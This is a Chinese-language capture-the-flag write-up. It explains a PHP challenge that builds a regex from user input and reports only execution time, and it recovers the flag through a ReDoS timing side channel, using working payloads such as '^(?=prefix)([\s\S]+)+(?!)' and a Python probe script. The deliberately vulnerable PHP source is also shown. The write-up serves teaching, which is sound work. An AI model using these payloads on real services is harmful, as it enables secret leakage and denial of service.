## 1. 这道题是什么

**目标**：`http://contest.ctf.nefu.edu.cn:32064/`（出题人的服务器）

**题目给你什么**：
- 一个网页，打开就能看到 PHP 源码（源码见第 2 节）
- 一个 URL 参数 `?x=随便什么`
- 页面回显一行字：`Exec Time: 0.000003`（服务器执行花了多少秒）

**题目藏了什么**：服务器上有个叫 `/flag` 的文件，里面是 44 个字符的答案，页面从不直接输出它。

**你要做的事**：利用"耗时"这个唯一的渠道，把 44 个字符一个字母一个字母问出来。

**最终答案**（新旧两个实例都一样，可供对照）：

```
nsilab{22f8fbd8-****-****-****-************}
```

> 前缀 `nsilab` 是出题方"网络安全与信息实验室"（NEFU NSILAB）的缩写，后面是 UUID 格式的随机串。

## 2. 逐行读懂代码

页面展示的源码长这样（我们把 HTML 高亮剥掉，只看 PHP 逻辑）：

```php
<?php
$FLAG = file_get_contents('/flag');   // ①
error_reporting(E_ALL);               // ②
highlight_file(__FILE__);             // ③

$startTime = microtime(true);         // ④
if (!empty($_GET['x'])){              // ⑤
    preg_match('/'.$_GET['x'].'/', $FLAG, $matches);  // ⑥
}

$endTime = microtime(true);           // ⑦
$runTime = $endTime - $startTime;     // ⑧

echo "Exec Time: ".$runTime;          // ⑨
```

逐行翻译：

| 行 | 干什么 |
|---|---|
| ① | 把服务器上 `/flag` 文件的内容读进变量 `$FLAG`——**这就是秘密**。 |
| ②③ | 无关紧要：打开报错显示、把本文件源码高亮打印（所以你能看到代码）。 |
| ④ | 记下"开始"的时刻（microtime = 精确到微秒的计时）。 |
| ⑤ | 如果 URL 带了 `?x=xxx` 参数才继续。 |
| ⑥ | **核心**：`preg_match(正则, 目标文本, 结果)`。正则 = `'/' . $_GET['x'] . '/'`，也就是"把你输入的 x 前后各加一个 `/` 当正则用"，去 `$FLAG` 里做匹配。匹配结果存进 `$matches`，但**页面从不打印它**。 |
| ⑦⑧ | 记下结束时刻，算出执行耗时。 |
| ⑨ | **唯一的输出**：耗时。 |

**总结成一句话**：你把一段"规则"（正则）发给服务器，服务器拿你的规则去它的秘密文本里找东西，然后只告诉你"花了多长时间"。

**攻击面在哪里**：`$_GET['x']` 完全由你控制，而且是**裸拼接**——你写什么，正则就是什么。这就是我们的"作案工具"。

> 注：这不是正常代码该有的写法。正常网站不会把用户输入直接拼成正则。出题人故意留的漏洞。

## 3. 四个必须懂的概念

### 3.1 什么是正则（Regex）

正则是一套"描述文本长什么样"的规则语言。举例：

| 正则 | 意思 | 例句（目标：hello123） |
|---|---|---|
| `h` | 文本里有没有字母 h | 有 → 匹配成功 |
| `^h` | 是不是以 h 开头 | 是 |
| `3$` | 是不是以 3 结尾 | 是 |
| `[0-9]+` | 一个或多个数字 | 有（123） |
| `h.+o` | h 开头、任意字符、o 结尾 | 匹配 hello |

`preg_match` 的工作就是：拿着你的规则，在目标文本里**寻找一个能匹配的地方**。找到→返回 1，找不到→返回 0。

### 3.2 什么是回溯（Backtracking）—— 正则引擎的"试错"

正则引擎找匹配时有个关键行为：**贪婪 + 后悔**。

想象你是一台分拣机器人，规则是"拿任意数量的苹果，最后必须再拿一个梨"（对应正则 `(a+)+b`）。你面前的传送带上是一排苹果。你的策略：

1. **贪婪**：先把苹果能拿多满拿多满（`a+` 会吃到不能再吃）；
2. 去看下一个是不是梨——不是；
3. **回溯**：吐回一个苹果，再试；不行再吐一个……直到试完所有"拿几个"的可能性。

每一次"吐回去重试"就叫一次**回溯**。正常情况回溯没几次就结束了，但某些正则形状下会爆炸（见下节）。

### 3.3 什么是灾难性回溯（ReDoS）—— 指数级爆炸

看这个形状：`(a+)+b`，目标是一长串 `a` 结尾跟一个 `b` 之外的字符，比如 30 个 a 后面跟个 X。

引擎要做的事：把 30 个 a **切成若干组**（每组至少 1 个），看最后一格是不是 b。

问题在于——**30 个 a 有多少种切法？** 在 29 个"缝隙"里，每个缝隙选切或不切，共 **2²⁹ ≈ 5.4 亿种**。每一种都要试，试完才承认失败。

- 30 个字符 → 5 亿次 → 卡顿
- 40 个字符 → 5 千亿次 → 网站直接卡死

**这就是 ReDoS（正则拒绝服务攻击）**：几个字符的正则，让 CPU 烧穿。而这个"越长越慢"的特性，反过来正是我们要的信号——见 3.4。

**为什么 `(a+)+` 会这样**：`+` 套 `+`（外层组重复、内层也重复），产生"同一个字符可以被分到不同组"的歧义，引擎就得把所有分法都试一遍。歧义越大、文本越长，试错次数指数增长。

### 3.4 什么是侧信道（Side-Channel）—— 时间就是信息

"侧信道"指：程序**本意不想**告诉你秘密，但从**旁边的渠道**漏了一点点。

本题的渠道是**时间**。类比：

> 猜转轮密码锁。密码转盘每格有数字 0-9，你不知道密码。但你发现：**转到正确的那位数字时，锁里会"咔哒"一声**（内部齿轮卡对了，转起来费劲）。
> 于是你：第一格 0 转一下听声音、1 转一下听声音……转到"咔哒"的那位就是第一位。然后第二格、第三格……
> 全程你没看到密码，但密码被你问出来了。

本题完全一样：

- 猜的**正则**碰到正确的字符时，引擎会多走一段路（多花时间）→ 像"咔哒"一声；
- 猜错时，开头就失败了 → 很快返回。

**你只需要一个"二选一探测器"：能让我区分'猜对了'和'猜错了'的请求。** 剩下的就是循环问 44 位。

flowchart TD

## 5. 第一步：验证时间差存在（手动）

先建立直觉。在浏览器地址栏访问：

```
http://contest.ctf.nefu.edu.cn:32064/?x=a
```

页面底部会出现类似：

```
Exec Time: 0.000004
```

（几微秒 = 瞬间完成。这个请求的正则就是 `/a/`，去 flag 里找字母 a，普通匹配，很快。）

再访问这个（注意 `+` 在网址里要写成 `%2B`，否则服务器收到的是空格）：

```
http://contest.ctf.nefu.edu.cn:32064/?x=^.(.+)%2B(?!)      ← 首字符随便, 必然进入爆炸区
```

你会看到耗时变成类似：

```
Exec Time: 0.002754
```

（约 2.7 毫秒——慢了几百倍！）

再试一个猜错前缀的：

```
http://contest.ctf.nefu.edu.cn:32064/?x=^zz(.+)%2B(?!)      ← 猜 zz 开头, 实际不是
```

又是几微秒。**这就是我们的信号**：慢 = 猜对，快 = 猜错。

> 手动试这三次的目的：让你亲眼确认"时间差存在"。后面全交给脚本，但脚本的原理就是这三下。

## 6. 第二步：写出计时器脚本（probe.py）

手动点太慢，写个小脚本替我们发请求、读耗时。`probe.py` 就是干这个的，核心代码：

```python
import re, requests, statistics, time

URL = "http://contest.ctf.nefu.edu.cn:32064/"   # 目标地址(改这里)

def probe(pattern, tries=3):
    """对一个正则, 测 tries 次, 返回耗时的中位数(秒)"""
    ts = []
    for _ in range(tries):
        r = requests.get(URL, params={"x": pattern}, timeout=15)  # 发请求
        m = re.search(r"Exec Time:</strong>\s*([0-9.eE+-]+)", r.text)  # 从页面里抠出耗时数字
        if m:
            ts.append(float(m.group(1)))       # 存下来
        time.sleep(0.02)                        # 等 20 毫秒, 别把服务器打太狠
    return statistics.median(ts)                # 取中位数: 抗网络抖动
```

**为什么取中位数而不是平均**：网络偶尔抽风一下，某一次请求会特别慢（假信号）。取中间值可以过滤掉这种偶发尖峰。

**跑法**（在 `redos` 文件夹里，PowerShell）：

```powershell
python probe.py "^(?=.)([\s\S]+)+(?!)" 3
```

第 1 个参数是正则，第 2 个参数是测几次。输出的 `med=` 就是耗时中位数。

## 7. 第三步：构造炸弹 payload（踩坑全过程）

`(?!)` 这个构造不是一拍脑袋想出来的，我们把**思考过程**完整记录在这里。你要记住的不是答案，是**踩坑 → 分析 → 换构造**的方法。

### 7.1 目标

造一个正则，满足：

1. **猜对前缀时特别慢，猜错时特别快**（信号）；
2. 慢的程度和"flag 内容长啥样"无关（通用性）。

### 7.2 第一次尝试：教科书爆炸 `^猜的(a+)+$` → 失败

```regex
^flag\{(a+)+$
```

实测：快。原因：`(a+)+` 需要**连续的 a** 才会爆炸，而 flag 是 `nsilab{22f8...`，开头根本没有 a，引擎第一格就失败了。

**教训**：爆炸区必须能匹配**任意**字符，不能依赖特定字符。

### 7.3 第二次尝试：万能点号 + 结尾字母 `^猜的(.+)+z` → 失败

```regex
^flag\{(.+)+z
```

实测：快。原因：PCRE（PHP 用的引擎）有个优化叫"**必需字符预检**"——如果模式结尾有个铁定要出现的字符（这里 z），引擎会先在整段文本里快速找一遍 z，**找不到就直接判失败**，连回溯都不做。flag 里没有 z，于是猜对猜错都是瞬间结束。

**教训**：结尾不能放具体字符。失败点必须是引擎"预检"看不到的东西。

### 7.4 最终构造：`(?!)` → 成功

```regex
^(?=猜的前缀)([\s\S]+)+(?!)
```

拆开看三个零件：

| 零件 | 写法 | 作用 |
|---|---|---|
| 前置检查 | `^(?=猜的前缀)` | 零宽断言：只看一眼开头是不是猜的（不消耗字符）。猜对放行，猜错立刻失败→快 |
| 炸弹 | `([\s\S]+)+` | 任意字符的嵌套量词 → 指数级回溯。`[\s\S]` = 匹配一切字符（含换行） |
| 失败点 | `(?!)` | "负向零宽断言"：断言这里啥也不该有 → 永远失败。没有字面量 → 预检管不着 → 逼引擎把所有分组方式试完才放弃 |

**运行效果**（实测数据，新服务器）：

| 场景 | 耗时 | 说明 |
|---|---|---|
| 猜对前缀（`^nsilab{...`） | ~2.7ms | 断言通过 → 进入爆炸区 → 撞上 PHP 回溯上限（默认 100 万步）才停 |
| 猜错前缀（`^zzzzzz...`） | ~58µs | 断言处就失败 → 秒回 |

信号差 **47 倍**，完美。

**为什么用 `(?=前缀)` 而不是 `^前缀([\s\S]+)+`**：断言是零宽的，断言完引擎还站在开头，爆炸区从头到尾吃**整个 flag**。这样不管你已经猜对了多少位，爆炸规模都是全长 44 字符，信号强度恒定。如果直接拼前缀，等猜到末尾时剩下的字符越来越少，爆炸越来越小，最后几位就测不出来了。**这细节决定成败。**

### 7.5 三个探测器（oracle）

把上面的构造套进三种场景，就是我们全部的工具：

```python
前缀探测器: ^(?=前缀)([\s\S]+)+(?!)        # 慢 ⟺ flag 以"前缀"开头
后缀探测器: ^(?=.*后缀$)([\s\S]+)+(?!)     # 慢 ⟺ flag 以"后缀"结尾
长度探测器: ^(?=[\s\S]{n}$)([\s\S]+)+(?!)   # 慢 ⟺ flag 正好 n 个字符
```

## 8. 第四步：测出 flag 长度

对着 n=1..60 逐个发**长度探测器**，只有 n 等于真实长度时才会慢。实测：

```
只有 n=44 命中 (2.7ms), 其他全部 ≤40µs
```

**flag 长度 = 44**。

为什么先测长度？因为后面要"前后夹击"，知道总长才知道什么时候该停手、两边会不会碰过头。

## 9. 第五步：逐字符提取（算法 + 防误报）

### 9.1 算法：两边夹

- **前端**（从前往后）：已知前缀 K，对每个候选字符 c 发 `^(?=K+c)(...)+(?!)`，谁慢谁就是下一位。
- **后端**（从后往前）：已知后缀 K，对每个候选字符 c 发 `^(?=.*c+K$)(...)+(?!)`，谁慢谁就是下一位。

选字符集：小写 + 大写 + 数字 + `{}_-` 等约 90 个字符。

### 9.2 防误报：三次测量 + 确认

网络会撒谎（实测遇到过假命中：某候选初测 99ms，复查只有 4µs）。所以每个字符的判定流程是：

1. **初测**：扫全部候选，每个测 2 次取中位数；
2. **排序**：取耗时最大的候选；
3. **确认**：超过阈值（100µs）的候选再单独测 2-3 次；
4. **收下**：确认仍然慢，才拼进已知字符串。

`solver.py` 里还加了一层保险：**候选按耗时排序后依次尝试**，第一个确认不过就试第二个——第一版脚本就是因为确认不过就直接跳过了那位，导致最后少了 1 个字符（43 ≠ 44），还得回头补。

### 9.3 真实输出长啥样

```
[*] flag length = 44
[+] front(1/44): 'n'
[+] front(2/44): 'ns'
[+] front(3/44): 'nsi'
...
[+] back (1/44): '}'
[+] back (2/44): '0}'
...
```

看到 `front` 和 `back` 慢慢长大，直到碰头。

## 10. 第六步：验证 flag

拿到拼好的 44 个字符后，**别急着交**。用两个探测器分别验证：

```
前缀探测器: ^(?=整个flag)([\s\S]+)+(?!)    → 慢 = flag 以它开头 ✓
后缀探测器: ^(?=.*整个flag$)([\s\S]+)+(?!) → 慢 = flag 以它结尾 ✓
```

前缀对 + 后缀对 + 长度对（44）→ 三个条件齐了，只可能是 flag 本身。

实测验证输出：

```
verify prefix=31.4ms suffix=2.8ms  ** PASS **
```

## 11. 坑点清单（全部实测踩过）

| # | 坑 | 现象 | 解法 |
|---|---|---|---|
| 1 | URL 里 `+` 变成空格 | 正则失效，全快 | 用 `requests` 的 `params` 传参（自动编码），或手写 `%2B` |
| 2 | 结尾放具体字符（`(.+)+z`） | PCRE 必需字符预检短路，无信号 | 收尾一律用 `(?!)` |
| 3 | 爆炸区依赖特定字符（`(a+)+`） | flag 无 a 就不爆 | 用 `[\s\S]+` 匹配一切 |
| 4 | 单次测量当结论 | 网络抖动产生假命中 | 测 2-3 次取中位数 + 命中再确认 |
| 5 | confirm 不过就跳过 | 少一位，最后对不上长度 | 候选排序后逐个试（solver.py 已处理） |
| 6 | 拿到结果不验证 | 心态崩 | 前缀/后缀/长度三方验证 |
| 7 | 换服务器不校准 | 阈值/量级全变 | 先跑 3-5 发看命中量级，再定阈值 |
| 8 | 全速并发打服务器 | 被封 IP / 打崩题 | 10 并发以内 + 请求间隔 20ms |
